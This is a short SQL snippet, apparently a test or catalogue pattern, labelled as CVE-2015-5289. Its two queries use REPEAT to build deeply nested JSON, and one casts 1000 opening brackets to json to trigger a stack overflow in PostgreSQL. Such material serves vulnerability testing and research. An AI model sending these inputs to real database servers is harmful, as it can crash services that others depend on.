-- CVE-2015-5289: PostgreSQL stack overflow via REPEAT to JSON
-- Pattern 3.1: Nested function with REPEAT to construct deep structure
SELECT REPEAT('[', 1000)::json;
SELECT REPEAT('{"a":', 100) || '1' || REPEAT('}', 100);
